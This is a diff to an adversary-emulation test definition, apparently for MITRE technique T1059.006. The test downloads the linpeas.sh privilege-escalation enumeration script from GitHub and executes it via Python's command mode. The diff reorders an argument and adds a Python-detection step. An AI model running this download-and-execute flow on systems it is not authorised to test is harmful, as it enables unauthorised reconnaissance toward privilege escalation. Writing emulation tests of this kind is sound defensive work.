@@ -2,6 +2,9 @@ api_version: "2.0"
 name: Execute shell script via python's command mode arguement
 description: Download and execute shell script and write to file then execute locally using Python -c (command mode)
 args:
+    - name: script_url
+      type: string
+      default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
     - name: payload_file_name
       type: string
       default: T1059.006-payload
@@ -11,9 +14,6 @@ args:
     - name: script_args
       type: string
       default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles
-    - name: script_url
-      type: string
-      default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
 uuid: 3a95cdb2-c6ea-4761-b24e-02b71889b8bb
 mitre:
     tactics:
@@ -26,6 +26,11 @@ requirements:
     platforms:
         - os: linux
 steps:
+    - name: Verify if python is in the environment variable path and attempt to import requests library.
+      inline: |
+        which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
+        $which_python -c 'import requests' 2>/dev/null; echo $?
+      executor: sh
     - name: execute-shell-script-via-python's-command-mode-arguement
       inline: |
         which_python=$(which python || which python3 || which python3.9 || which python2)
